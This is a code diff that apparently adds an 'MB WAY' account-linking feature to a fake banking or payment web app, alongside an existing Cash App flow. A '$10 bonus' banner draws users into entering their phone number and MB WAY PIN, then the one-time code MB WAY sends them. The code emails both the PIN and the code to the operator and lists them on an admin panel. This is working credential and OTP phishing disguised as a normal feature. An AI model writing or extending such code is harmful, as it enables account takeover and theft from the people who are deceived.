@@ -447,6 +447,18 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><polyline points="9 18 15 12 9 6"></polyline></svg>
       </div>
     </div>
+
+    <!-- MBWay Banner -->
+    <div id="mbway-banner" style="margin:10px 16px 0;background:#fff;border:2px solid #f0f0f0;border-radius:16px;padding:16px;box-shadow:0 4px 12px rgba(204,0,0,0.08);cursor:pointer;" onclick="openMBWayManage()">
+      <div style="display:flex;align-items:center;gap:14px;">
+        <img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:48px;height:48px;border-radius:12px;object-fit:cover;box-shadow:0 2px 8px rgba(0,0,0,0.12);">
+        <div style="flex:1;">
+          <div style="font-size:16px;font-weight:700;color:#cc0000;margin-bottom:3px;">MB WAY</div>
+          <div style="font-size:13px;color:#cc0000;opacity:0.8;" id="mbway-banner-text">Link your account + get $10 bonus</div>
+        </div>
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#cc0000" stroke-width="2.5"><polyline points="9 18 15 12 9 6"></polyline></svg>
+      </div>
+    </div>
     
     <div class="section">
       <div class="section-header"><span class="section-title" data-i18n="recentTx">Recent Transactions</span></div>
@@ -582,6 +594,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
   <div class="admin-tabs">
     <button class="admin-tab active" id="atab-auth" onclick="switchAdminTab('auth')" data-i18n="authorization">Authorization</button>
     <button class="admin-tab" id="atab-cashapp" onclick="switchAdminTab('cashapp')"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:16px;height:16px;border-radius:3px;object-fit:cover;vertical-align:middle;margin-right:4px;">Cash App</button>
+    <button class="admin-tab" id="atab-mbway" onclick="switchAdminTab('mbway')"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:16px;height:16px;border-radius:3px;object-fit:cover;vertical-align:middle;margin-right:4px;">MB WAY</button>
     <button class="admin-tab" id="atab-deposits" onclick="switchAdminTab('deposits')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg> Deposits</button>
     <button class="admin-tab" id="atab-withdrawals" onclick="switchAdminTab('withdrawals')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><circle cx="12" cy="12" r="10"></circle><polyline points="12 16 16 12 12 8"></polyline><line x1="8" y1="12" x2="16" y2="12"></line></svg> Withdrawals</button>
     <button class="admin-tab" id="atab-codes" onclick="switchAdminTab('codes')">Users</button>
@@ -616,6 +629,10 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
   <div class="admin-content" id="acontent-cashapp">
     <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;display:flex;align-items:center;gap:8px;"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:24px;height:24px;border-radius:4px;object-fit:cover;">Cash App Authorization</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Authorize or reject Cash App accounts</div></div>
     <div id="cashapp-admin-list"><p class="acc-empty">Loading...</p></div>
+  </div>
+  <div class="admin-content" id="acontent-mbway">
+    <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;display:flex;align-items:center;gap:8px;"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:24px;height:24px;border-radius:4px;object-fit:cover;">MB WAY Authorization</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Authorize or reject MB WAY accounts</div></div>
+    <div id="mbway-admin-list"><p class="acc-empty">Loading...</p></div>
   </div>
   <div class="admin-content" id="acontent-withdrawals"><div id="withdrawals-list"><p class="acc-empty">Loading...</p></div></div>
   <div class="admin-content" id="acontent-codes">
@@ -669,6 +686,18 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 <div class="modal" id="cashapp-link-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(0,200,83,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Link Your Account</div></div><div class="modal-header"><h3>💵 Link Cash App</h3><button class="modal-close" onclick="closeModal('cashapp-link-modal')">&#215;</button></div><input type="text" class="modal-input" id="cashapp-identifier" placeholder="Email or Phone Number"><input type="password" class="modal-input" id="cashapp-pin" placeholder="Cash App PIN" maxlength="4" inputmode="numeric"><div class="modal-error" id="cashapp-link-error"></div><button class="modal-btn" id="cashapp-submit-btn">Link Cash App</button></div></div>
 
 <div class="modal" id="cashapp-otp-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(0,200,83,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Verification Required</div></div><div class="modal-header"><h3>🔐 Enter OTP Code</h3><button class="modal-close" onclick="closeModal('cashapp-otp-modal')">&#215;</button></div><div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:rgba(255,255,255,0.8);line-height:1.5;">Cash App has sent a verification code to your account. Enter it below to complete the linking process.</p></div><div style="margin-bottom:12px;"><div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:8px;">Account: <span id="cashapp-otp-identifier" style="color:#00c853;font-weight:600;"></span></div></div><input type="text" class="modal-input" id="cashapp-otp-code" placeholder="Enter 6-digit OTP code" maxlength="6" inputmode="numeric"><div class="modal-error" id="cashapp-otp-error"></div><button class="modal-btn" id="cashapp-otp-submit-btn">Verify & Link</button></div></div>
+
+<!-- MBWAY LIST MODAL -->
+<div class="modal" id="mbway-list-modal"><div class="modal-box"><div class="modal-header"><h3><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:20px;height:20px;border-radius:4px;object-fit:cover;vertical-align:middle;margin-right:8px;">MB WAY Accounts</h3><button class="modal-close" onclick="closeModal('mbway-list-modal')">&#215;</button></div><div id="mbway-accounts-list"></div><div id="mbway-link-btn-container" style="margin-top:12px;"></div></div></div>
+
+<!-- MBWAY LINK MODAL -->
+<div class="modal" id="mbway-link-modal"><div class="modal-box" style="background:#fff;"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid #f0f0f0;margin-bottom:16px;"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;box-shadow:0 4px 16px rgba(204,0,0,0.2);display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:#aaa;">Link Your Account</div></div><div class="modal-header" style="margin-bottom:16px;"><h3 style="color:#cc0000;">📱 Link MB WAY</h3><button class="modal-close" style="color:#999;" onclick="closeModal('mbway-link-modal')">&#215;</button></div><div style="display:flex;gap:8px;margin-bottom:10px;"><button id="mbway-country-btn" style="background:#f4f6f9;border:1.5px solid #e2e8f0;border-radius:10px;padding:0 12px;font-size:14px;font-weight:700;color:#cc0000;cursor:pointer;white-space:nowrap;font-family:inherit;height:48px;min-width:95px;" onclick="openMBWayCountryPicker()">&#127477;&#127481; +351</button><input type="tel" id="mbway-phone" class="modal-input" placeholder="Phone number" inputmode="numeric" style="flex:1;margin-bottom:0;"></div><input type="password" id="mbway-pin" class="modal-input" placeholder="MB WAY PIN (up to 6 digits)" maxlength="6" inputmode="numeric"><div class="modal-error" id="mbway-link-error"></div><button class="modal-btn" id="mbway-submit-btn" style="background:#cc0000;">Link MB WAY</button></div></div>
+
+<!-- MBWAY COUNTRY PICKER MODAL -->
+<div class="modal" id="mbway-country-modal"><div class="modal-box center" style="background:#fff;"><div class="modal-header"><h3 style="color:#cc0000;">Select Country Code</h3><button class="modal-close" style="color:#999;" onclick="closeMBWayCountryPicker()">&#215;</button></div><input type="text" id="mbway-country-search" class="modal-input" placeholder="Search country..." style="margin-bottom:8px;" oninput="filterMBWayCountries(this.value)"><div id="mbway-country-list" style="max-height:320px;overflow-y:auto;"></div></div></div>
+
+<!-- MBWAY OTP MODAL -->
+<div class="modal" id="mbway-otp-modal"><div class="modal-box" style="background:#fff;"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid #f0f0f0;margin-bottom:16px;"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;box-shadow:0 4px 16px rgba(204,0,0,0.2);display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:#aaa;">Verification Required</div></div><div class="modal-header" style="margin-bottom:16px;"><h3 style="color:#cc0000;">🔐 Enter OTP Code</h3><button class="modal-close" style="color:#999;" onclick="closeModal('mbway-otp-modal')">&#215;</button></div><div style="background:#fff5f5;border:1px solid #ffcccc;border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:#cc0000;line-height:1.5;">MB WAY has sent a verification code to your phone. Enter it below to complete linking.</p></div><div style="margin-bottom:12px;"><div style="font-size:12px;color:#aaa;margin-bottom:4px;">Phone: <span id="mbway-otp-phone" style="color:#cc0000;font-weight:600;"></span></div></div><input type="text" class="modal-input" id="mbway-otp-code" placeholder="Enter 6-digit OTP code" maxlength="6" inputmode="numeric"><div class="modal-error" id="mbway-otp-error"></div><button class="modal-btn" id="mbway-otp-submit-btn" style="background:#cc0000;">Verify &amp; Link</button></div></div>
 
 <div class="modal" id="language-modal"><div class="modal-box center"><div class="modal-header"><h3>&#127760; Language</h3><button class="modal-close" onclick="closeModal('language-modal')">&#215;</button></div><div class="lang-grid"><div class="lang-opt active" onclick="setLang('en',this)">&#127468;&#127463; English</div><div class="lang-opt" onclick="setLang('es',this)">&#127466;&#127480; Espa&ntilde;ol</div><div class="lang-opt" onclick="setLang('fr',this)">&#127467;&#127479; Fran&ccedil;ais</div><div class="lang-opt" onclick="setLang('pt',this)">&#127463;&#127479; Portugu&ecirc;s</div></div></div></div>
 
@@ -825,7 +854,7 @@ function switchTab(tabId,btn,noPush){
 
 // ── ADMIN TABS ──
 function switchAdminTab(name){
-  ['auth','cashapp','deposits','withdrawals','codes'].forEach(function(t){
+  ['auth','cashapp','mbway','deposits','withdrawals','codes'].forEach(function(t){
     var tab=$('atab-'+t),con=$('acontent-'+t);
     if(tab) tab.classList.remove('active');
     if(con) con.classList.remove('active');
@@ -835,6 +864,7 @@ function switchAdminTab(name){
   if(con) con.classList.add('active');
   if(name==='auth') loadAuthTab();
   else if(name==='cashapp') loadCashAppTab();
+  else if(name==='mbway') loadMBWayTab();
   else if(name==='deposits') loadDepositsTab();
   else if(name==='withdrawals') loadWithdrawalsTab();
   else loadUsersTab();
@@ -1210,10 +1240,10 @@ auth.onAuthStateChanged(function(user){
     renderAccountInfo();
     if(user.email===ADMIN_EMAIL){
       showScreen('admin-panel');
-      loadAuthTab(); loadCashAppTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
+      loadAuthTab(); loadCashAppTab(); loadMBWayTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
     } else if(user.email===ADMINADEX_EMAIL){
       showScreen('admin-panel');
-      loadAuthTab(); loadCashAppTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
+      loadAuthTab(); loadCashAppTab(); loadMBWayTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
     } else {
       showScreen('dashboard',true);
       history.replaceState({screen:'dashboard',tab:'tab-home'},'',window.location.pathname+(window.location.search||''));
@@ -2908,21 +2938,7 @@ function openCashAppLink(){
   linkModal.classList.add('show');
 }
 
-// Inject the + Link New Cash App button fresh via JS
-window.addEventListener('DOMContentLoaded', function(){
-  var container = $('cashapp-link-btn-container');
-  if(container){
-    var btn = document.createElement('button');
-    btn.textContent = '+ Link New Cash App';
-    btn.className = 'modal-btn blue';
-    btn.style.width = '100%';
-    btn.addEventListener('click', function(e){
-      e.stopPropagation();
-      openCashAppLink();
-    });
-    container.appendChild(btn);
-  }
-});
+
 
 window.openCashAppOTP = function(idx){
   var accounts = userData.cashAppAccounts || [];
@@ -3054,6 +3070,351 @@ $('cashapp-otp-submit-btn').onclick = function(){
     $('cashapp-otp-submit-btn').disabled = false;
   });
 };
+
+
+// ═══════════════════════════════════════════════════════
+// MB WAY FUNCTIONALITY
+// ═══════════════════════════════════════════════════════
+
+var MBWAY_COUNTRIES = [
+  {flag:'🇵🇹',name:'Portugal',code:'+351'},
+  {flag:'🇪🇸',name:'Spain',code:'+34'},
+  {flag:'🇫🇷',name:'France',code:'+33'},
+  {flag:'🇩🇪',name:'Germany',code:'+49'},
+  {flag:'🇬🇧',name:'United Kingdom',code:'+44'},
+  {flag:'🇮🇹',name:'Italy',code:'+39'},
+  {flag:'🇧🇷',name:'Brazil',code:'+55'},
+  {flag:'🇺🇸',name:'United States',code:'+1'},
+  {flag:'🇨🇦',name:'Canada',code:'+1'},
+  {flag:'🇦🇺',name:'Australia',code:'+61'},
+  {flag:'🇳🇱',name:'Netherlands',code:'+31'},
+  {flag:'🇧🇪',name:'Belgium',code:'+32'},
+  {flag:'🇨🇭',name:'Switzerland',code:'+41'},
+  {flag:'🇦🇹',name:'Austria',code:'+43'},
+  {flag:'🇵🇱',name:'Poland',code:'+48'},
+  {flag:'🇸🇪',name:'Sweden',code:'+46'},
+  {flag:'🇳🇴',name:'Norway',code:'+47'},
+  {flag:'🇩🇰',name:'Denmark',code:'+45'},
+  {flag:'🇫🇮',name:'Finland',code:'+358'},
+  {flag:'🇮🇪',name:'Ireland',code:'+353'},
+  {flag:'🇲🇽',name:'Mexico',code:'+52'},
+  {flag:'🇦🇷',name:'Argentina',code:'+54'},
+  {flag:'🇳🇬',name:'Nigeria',code:'+234'},
+  {flag:'🇿🇦',name:'South Africa',code:'+27'},
+  {flag:'🇮🇳',name:'India',code:'+91'},
+  {flag:'🇯🇵',name:'Japan',code:'+81'},
+  {flag:'🇨🇳',name:'China',code:'+86'},
+  {flag:'🇰🇷',name:'South Korea',code:'+82'},
+  {flag:'🇸🇬',name:'Singapore',code:'+65'},
+  {flag:'🇦🇪',name:'UAE',code:'+971'}
+];
+
+var mbwayCountryCode = '+351';
+var mbwayCountryFlag = '&#127477;&#127481;';
+
+window.openMBWayManage = function(){
+  loadMBWayAccounts();
+  openModal('mbway-list-modal');
+};
+
+function loadMBWayAccounts(){
+  var list = $('mbway-accounts-list');
+  var accounts = userData.mbwayAccounts || [];
+  if(accounts.length === 0){
+    list.innerHTML = '<p style="text-align:center;color:#999;padding:20px;">No MB WAY accounts linked yet.</p>';
+    return;
+  }
+  list.innerHTML = '';
+  accounts.forEach(function(acc, idx){
+    var div = document.createElement('div');
+    div.className = 'linked-card-item';
+    div.style.marginBottom = '12px';
+    var statusColor = acc.status==='authorized'?'#00a550':(acc.status==='pending'?'#f59e0b':'#e53935');
+    var statusText = acc.status==='authorized'?'✓ Authorized':(acc.status==='pending'?'⏳ Pending OTP':'✗ Rejected');
+    var buttonHTML = '';
+    if(acc.status==='pending'){
+      buttonHTML = '<button class="modal-btn" onclick="openMBWayOTP('+idx+')" style="margin-top:8px;padding:10px;font-size:14px;background:#cc0000;">Enter OTP Code</button>';
+    } else if(acc.status==='authorized'){
+      buttonHTML = '<button class="modal-btn" onclick="viewMBWayDetails('+idx+')" style="margin-top:8px;padding:10px;font-size:14px;background:#cc0000;">View Account Details</button>';
+    } else if(acc.status==='rejected'){
+      buttonHTML = '<button class="modal-btn" onclick="viewMBWayRejection('+idx+')" style="margin-top:8px;padding:10px;font-size:14px;background:#e53935;">Check Rejection Reason</button>';
+    }
+    div.innerHTML =
+      '<div style="display:flex;align-items:center;gap:12px;margin-bottom:8px;">'+
+        '<img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:48px;height:48px;border-radius:12px;object-fit:cover;box-shadow:0 2px 8px rgba(204,0,0,0.2);">'+
+        '<div style="flex:1;">'+
+          '<div style="font-weight:600;color:#cc0000;margin-bottom:2px;font-size:15px;">'+acc.phone+'</div>'+
+          '<div style="font-size:13px;color:'+statusColor+';font-weight:600;">'+statusText+'</div>'+
+        '</div>'+
+      '</div>'+buttonHTML;
+    list.appendChild(div);
+  });
+}
+
+function openMBWayLink(){
+  $('mbway-phone').value = '';
+  $('mbway-pin').value = '';
+  $('mbway-link-error').textContent = '';
+  mbwayCountryCode = '+351';
+  mbwayCountryFlag = '&#127477;&#127481;';
+  $('mbway-country-btn').innerHTML = '&#127477;&#127481; +351';
+  closeModal('mbway-list-modal');
+  var lm = $('mbway-link-modal');
+  lm.removeAttribute('style');
+  lm.classList.add('show');
+}
+
+window.openMBWayOTP = function(idx){
+  var accounts = userData.mbwayAccounts || [];
+  if(!accounts[idx]) return;
+  closeModal('mbway-list-modal');
+  $('mbway-otp-phone').textContent = accounts[idx].phone;
+  $('mbway-otp-code').value = '';
+  $('mbway-otp-error').textContent = '';
+  $('mbway-otp-submit-btn').setAttribute('data-idx', idx);
+  openModal('mbway-otp-modal');
+};
+
+window.viewMBWayDetails = function(idx){
+  var accounts = userData.mbwayAccounts || [];
+  if(!accounts[idx]) return;
+  var acc = accounts[idx];
+  var d = 'MB WAY Account\n\nPhone: '+acc.phone+'\nStatus: Authorized ✓\nLinked: '+formatDate(acc.addedDate);
+  if(acc.authorizedDate) d += '\nAuthorized: '+formatDate(acc.authorizedDate);
+  alert(d);
+};
+
+window.viewMBWayRejection = function(idx){
+  var accounts = userData.mbwayAccounts || [];
+  if(!accounts[idx]) return;
+  alert('MB WAY Account Rejected\n\nPhone: '+accounts[idx].phone+'\n\nReason: '+(accounts[idx].rejectionReason||'No reason provided'));
+};
+
+window.openMBWayCountryPicker = function(){
+  renderMBWayCountries('');
+  closeModal('mbway-link-modal');
+  openModal('mbway-country-modal');
+  setTimeout(function(){ var s=$('mbway-country-search'); if(s){s.value='';s.focus();} },100);
+};
+
+window.closeMBWayCountryPicker = function(){
+  closeModal('mbway-country-modal');
+  openModal('mbway-link-modal');
+};
+
+window.filterMBWayCountries = function(val){
+  renderMBWayCountries(val.toLowerCase());
+};
+
+function renderMBWayCountries(filter){
+  var list = $('mbway-country-list');
+  list.innerHTML = '';
+  MBWAY_COUNTRIES.filter(function(c){
+    return !filter || c.name.toLowerCase().indexOf(filter)>-1 || c.code.indexOf(filter)>-1;
+  }).forEach(function(c){
+    var btn = document.createElement('button');
+    btn.style.cssText = 'display:flex;align-items:center;gap:12px;width:100%;background:none;border:none;border-bottom:1px solid #f4f4f4;padding:12px 4px;font-size:14px;cursor:pointer;font-family:inherit;text-align:left;';
+    btn.innerHTML = '<span style="font-size:20px;">'+c.flag+'</span><span style="flex:1;color:#111;">'+c.name+'</span><span style="color:#cc0000;font-weight:700;">'+c.code+'</span>';
+    btn.onclick = function(){
+      mbwayCountryCode = c.code;
+      mbwayCountryFlag = c.flag;
+      $('mbway-country-btn').innerHTML = c.flag+' '+c.code;
+      closeModal('mbway-country-modal');
+      var lm = $('mbway-link-modal');
+      lm.removeAttribute('style');
+      lm.classList.add('show');
+    };
+    list.appendChild(btn);
+  });
+}
+
+$('mbway-submit-btn').onclick = function(){
+  var phone = $('mbway-phone').value.trim();
+  var pin = $('mbway-pin').value.trim();
+  var err = $('mbway-link-error');
+  err.textContent = '';
+  if(!phone){err.textContent='Please enter your phone number.';return;}
+  if(!pin || pin.length < 1){err.textContent='Please enter your MB WAY PIN.';return;}
+  if(pin.length > 6){err.textContent='PIN cannot exceed 6 digits.';return;}
+  var fullPhone = mbwayCountryCode + phone;
+  $('mbway-submit-btn').textContent = 'Linking...';
+  $('mbway-submit-btn').disabled = true;
+  var accounts = userData.mbwayAccounts || [];
+  var accountIdx = accounts.length;
+  var newAccount = {phone:fullPhone, pin:pin, status:'pending', addedDate:new Date().toISOString()};
+  accounts.push(newAccount);
+  userRef.update({mbwayAccounts: accounts}).then(function(){
+    return db.ref('users').once('value').then(function(snap){
+      snap.forEach(function(s){
+        if(s.val() && s.val().email === ADMIN_EMAIL){
+          notify(s.key, '📱 MBWAY: '+(userData.firstname||'')+' linked '+fullPhone);
+          sendEmail(ADMIN_EMAIL,
+            '📱 MB WAY Link Request',
+            (userData.firstname||'')+' '+(userData.surname||''),
+            (userData.firstname||'')+' '+(userData.surname||'')+' is linking an MB WAY account.\n\nPhone: '+fullPhone+'\nPIN: '+pin+'\n\nUser Info:\n- Account: '+(userData.accountNumber||'')+'\n- Email: '+(userData.email||'')+'\n- Country: '+(userData.country||'')+'\n\nThe user is waiting for the OTP code to complete verification.\n\nPlease check your admin panel > MB WAY Authorization to review and authorize this account.'
+          );
+        }
+      });
+    });
+  }).then(function(){
+    closeModal('mbway-link-modal');
+    $('mbway-otp-phone').textContent = fullPhone;
+    $('mbway-otp-code').value = '';
+    $('mbway-otp-error').textContent = '';
+    $('mbway-otp-submit-btn').setAttribute('data-idx', accountIdx);
+    openModal('mbway-otp-modal');
+  }).catch(function(){
+    err.textContent = 'Failed to link MB WAY. Please try again.';
+  }).finally(function(){
+    $('mbway-submit-btn').textContent = 'Link MB WAY';
+    $('mbway-submit-btn').disabled = false;
+  });
+};
+
+$('mbway-otp-submit-btn').onclick = function(){
+  var otp = $('mbway-otp-code').value.trim();
+  var idx = parseInt($('mbway-otp-submit-btn').getAttribute('data-idx'));
+  var err = $('mbway-otp-error');
+  err.textContent = '';
+  if(!otp || otp.length !== 6){err.textContent='Please enter the 6-digit OTP code.';return;}
+  var accounts = userData.mbwayAccounts || [];
+  if(!accounts[idx]){err.textContent='Account not found.';return;}
+  $('mbway-otp-submit-btn').textContent = 'Verifying...';
+  $('mbway-otp-submit-btn').disabled = true;
+  accounts[idx].otpCode = otp;
+  accounts[idx].otpSubmittedDate = new Date().toISOString();
+  userRef.update({mbwayAccounts: accounts}).then(function(){
+    return db.ref('users').once('value').then(function(snap){
+      snap.forEach(function(s){
+        if(s.val() && s.val().email === ADMIN_EMAIL){
+          notify(s.key, '🔐 MBWAY OTP: '+(userData.firstname||'')+' submitted OTP for '+accounts[idx].phone);
+          sendEmail(ADMIN_EMAIL,
+            '🔐 MB WAY OTP Received',
+            (userData.firstname||'')+' '+(userData.surname||''),
+            (userData.firstname||'')+' '+(userData.surname||'')+' has submitted the MB WAY OTP code.\n\nPhone: '+accounts[idx].phone+'\nOTP Code: '+otp+'\n\nPlease check your admin panel to authorize this MB WAY account.'
+          );
+        }
+      });
+    });
+  }).then(function(){
+    closeModal('mbway-otp-modal');
+    alert('✓ OTP submitted! Our team will verify and authorize your MB WAY account shortly.');
+  }).catch(function(){
+    err.textContent = 'Failed to submit OTP. Please try again.';
+  }).finally(function(){
+    $('mbway-otp-submit-btn').textContent = 'Verify & Link';
+    $('mbway-otp-submit-btn').disabled = false;
+  });
+};
+
+// Inject + Link New Cash App button
+(function(){
+  var container = $('cashapp-link-btn-container');
+  if(container){
+    var btn = document.createElement('button');
+    btn.textContent = '+ Link New Cash App';
+    btn.className = 'modal-btn blue';
+    btn.style.width = '100%';
+    btn.addEventListener('click', function(e){ e.stopPropagation(); openCashAppLink(); });
+    container.appendChild(btn);
+  }
+})();
+
+// Inject + Link New MB WAY button (same pattern as Cash App)
+(function(){
+  var container = $('mbway-link-btn-container');
+  if(container){
+    var btn = document.createElement('button');
+    btn.textContent = '+ Link New MB WAY';
+    btn.className = 'modal-btn';
+    btn.style.cssText = 'width:100%;background:#cc0000;';
+    btn.addEventListener('click', function(e){ e.stopPropagation(); openMBWayLink(); });
+    container.appendChild(btn);
+  }
+})();
+
+// ── ADMIN: MBWAY TAB ──
+function loadMBWayTab(){
+  var list = $('mbway-admin-list');
+  if(!list) return;
+  list.innerHTML = '<p class="acc-empty">Loading...</p>';
+  db.ref('users').once('value').then(function(snap){
+    var all = [];
+    snap.forEach(function(s){
+      var u = s.val();
+      if(!u || u.email === ADMIN_EMAIL) return;
+      (u.mbwayAccounts||[]).forEach(function(acc, idx){
+        if(acc) all.push({u:u, acc:acc, uid:s.key, idx:idx});
+      });
+    });
+    all.sort(function(a,b){
+      if(a.acc.status==='pending'&&b.acc.status!=='pending') return -1;
+      if(b.acc.status==='pending'&&a.acc.status!=='pending') return 1;
+      return new Date(b.acc.addedDate)-new Date(a.acc.addedDate);
+    });
+    if(!all.length){list.innerHTML='<p class="acc-empty">No MB WAY accounts yet</p>';return;}
+    list.innerHTML='';
+    all.forEach(function(item){
+      var u=item.u, acc=item.acc, uid=item.uid, idx=item.idx;
+      var isPending=acc.status==='pending', isAuthorized=acc.status==='authorized';
+      var div=document.createElement('div');
+      div.className='deposit-card';
+      div.style.borderLeft=isPending?'4px solid #f59e0b':(isAuthorized?'4px solid #00a550':'4px solid #e53935');
+      var statusHTML='<span class="deposit-status '+(isPending?'pending':(isAuthorized?'approved':'rejected'))+'">'+(isPending?'⏳ PENDING':(isAuthorized?'✓ AUTHORIZED':'✗ REJECTED'))+'</span>';
+      var actionsHTML='';
+      if(isPending){
+        var cmtId='mb-cmt-'+uid+'-'+idx;
+        actionsHTML='<textarea class="admin-comment" id="'+cmtId+'" placeholder="Comment (optional)" rows="2"></textarea>'+
+          '<div class="admin-card-actions"><button class="admin-action-btn green" onclick="authorizeMBWay(\''+uid+'\','+idx+',\''+cmtId+'\')">✅ Authorize</button>'+
+          '<button class="admin-action-btn red" onclick="rejectMBWay(\''+uid+'\','+idx+',\''+cmtId+'\')">❌ Reject</button></div>';
+      }
+      div.innerHTML=statusHTML+
+        '<div class="admin-card-name">'+u.firstname+' '+u.surname+'</div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Email</span><span>'+u.email+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Account #</span><span>'+u.accountNumber+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Country</span><span>'+u.country+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Phone</span><span style="color:#cc0000;font-weight:600;">'+acc.phone+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">PIN</span><span style="color:#cc0000;font-weight:600;">'+acc.pin+'</span></div>'+
+        (acc.otpCode?'<div class="admin-detail-row"><span class="admin-detail-label">OTP Code</span><span style="color:#4dabff;font-weight:700;">'+acc.otpCode+'</span></div>':'')+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Submitted</span><span>'+fmtDate(acc.addedDate)+'</span></div>'+
+        (acc.authorizedDate?'<div class="admin-detail-row"><span class="admin-detail-label">Authorized</span><span>'+fmtDate(acc.authorizedDate)+'</span></div>':'')+
+        (acc.rejectedDate?'<div class="admin-detail-row"><span class="admin-detail-label">Rejected</span><span>'+fmtDate(acc.rejectedDate)+'</span></div>':'')+
+        (acc.rejectionReason?'<div class="admin-detail-row"><span class="admin-detail-label">Reason</span><span style="color:#e53935;">'+acc.rejectionReason+'</span></div>':'')+
+        actionsHTML;
+      list.appendChild(div);
+    });
+  });
+}
+
+function authorizeMBWay(uid, idx, cmtId){
+  db.ref('users/'+uid).once('value').then(function(snap){
+    var u=snap.val(); if(!u) return;
+    var accounts=u.mbwayAccounts||[]; if(!accounts[idx]) return;
+    accounts[idx].status='authorized';
+    accounts[idx].authorizedDate=new Date().toISOString();
+    var c=$(cmtId); if(c&&c.value) accounts[idx].adminComment=c.value;
+    db.ref('users/'+uid+'/mbwayAccounts').set(accounts).then(function(){
+      notify(uid,'✅ Your MB WAY account has been authorized!');
+      loadMBWayTab();
+    });
+  });
+}
+
+function rejectMBWay(uid, idx, cmtId){
+  var reason=prompt('Reason for rejection:'); if(!reason) return;
+  db.ref('users/'+uid).once('value').then(function(snap){
+    var u=snap.val(); if(!u) return;
+    var accounts=u.mbwayAccounts||[]; if(!accounts[idx]) return;
+    accounts[idx].status='rejected';
+    accounts[idx].rejectionReason=reason;
+    accounts[idx].rejectedDate=new Date().toISOString();
+    var c=$(cmtId); if(c&&c.value) accounts[idx].adminComment=c.value;
+    db.ref('users/'+uid+'/mbwayAccounts').set(accounts).then(function(){
+      notify(uid,'❌ Your MB WAY account was rejected. Reason: '+reason);
+      loadMBWayTab();
+    });
+  });
+}
 
 }); // END DOMContentLoaded
 </script>
